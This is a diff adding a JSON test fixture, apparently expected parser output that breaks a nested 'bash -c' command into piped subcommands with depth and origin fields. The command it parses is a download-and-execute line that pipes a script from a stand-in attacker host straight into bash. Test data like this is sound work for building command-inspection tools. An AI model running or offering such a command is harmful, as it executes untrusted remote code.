@@ -1,0 +1,43 @@
+[
+  {
+    "argv": [
+      "bash",
+      "-c",
+      "curl https://attacker.com/stage2.sh | bash"
+    ],
+    "original": [
+      "bash",
+      "-c",
+      "curl https://attacker.com/stage2.sh | bash"
+    ],
+    "terminator": "NEWLINE",
+    "reentry": [
+      {
+        "argv": [
+          "curl",
+          "https://attacker.com/stage2.sh"
+        ],
+        "original": [
+          "curl",
+          "https://attacker.com/stage2.sh"
+        ],
+        "terminator": "PIPE",
+        "depth": 1,
+        "origin": "bash-c"
+      },
+      {
+        "argv": [
+          "bash"
+        ],
+        "original": [
+          "bash"
+        ],
+        "terminator": "NEWLINE",
+        "depth": 1,
+        "origin": "bash-c"
+      }
+    ],
+    "depth": 0,
+    "origin": "top"
+  }
+]
